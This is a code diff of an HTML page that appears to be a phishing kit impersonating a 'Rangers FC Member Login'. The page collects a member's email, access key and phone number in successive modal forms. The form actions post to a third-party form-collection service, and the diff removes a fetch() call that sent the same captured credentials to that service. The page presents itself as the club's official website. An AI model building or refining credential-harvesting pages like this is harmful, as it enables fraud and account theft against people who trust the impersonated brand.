@@ -93,12 +93,11 @@
             font-size: 14px;
             opacity: 0.7; /* Faded look */
         }
-
     </style>
 </head>
 <body>
 
-<!-- Modal Login Form -->
+<!-- Modal Login Form (Email and Access Key) -->
 <div class="modal" id="loginModal">
     <h2>Rangers FC Member Login</h2>
     <form id="loginForm" action="https://getform.io/f/avrmyepa" method="POST">
@@ -108,42 +107,39 @@
     </form>
 </div>
 
-<!-- Phone Number Input (hidden initially) -->
+<!-- Phone Number Input -->
 <div class="modal" id="phoneModal" style="display: none;">
     <h2>Enter Your Phone Number</h2>
     <form id="phoneForm" action="https://getform.io/f/avrmyepa" method="POST">
-        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number, we will send the form immediately to your phone." required>
+        <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required>
         <button type="submit">Submit</button>
     </form>
 </div>
 
-<!-- Footer with Rangers branding -->
 <div class="footer">
     <p>Official Website | Rangers Football Club</p>
 </div>
 
 <script>
-    // Show phone number form after email/accesskey submission
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        
+
         // Capture email and access key
         const email = document.getElementById('email').value;
         const accesskey = document.getElementById('accesskey').value;
+
+        // Log captured data to console for troubleshooting
+        console.log(`Email: ${email}, Access Key: ${accesskey}`);
 
         // Hide the login modal and show the phone number modal
         document.getElementById('loginModal').style.display = 'none';
         document.getElementById('phoneModal').style.display = 'block';
 
-        // Optionally log data to the console for testing
-        console.log(`Email: ${email}, Access Key: ${accesskey}`);
-        
         // Save data for later use (e.g., store it in a variable or send to the server immediately)
         window.email = email;
         window.accesskey = accesskey;
     });
 
-    // Handle phone number form submission
     document.getElementById('phoneForm').addEventListener('submit', function(e) {
         e.preventDefault();
 
@@ -152,25 +148,6 @@
 
         // Log the phone number along with email and accesskey
         console.log(`Phone: ${phone}, Email: ${window.email}, Access Key: ${window.accesskey}`);
-
-        // Send data to Getform
-        fetch('https://getform.io/f/avrmyepa', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                email: window.email,
-                accesskey: window.accesskey,
-                phone: phone
-            })
-        })
-        .then(response => response.text())
-        .then(data => {
-            // Handle response from server
-            alert('Form submitted successfully!');
-        })
-        .catch(error => console.error('Error:', error));
     });
 </script>
 
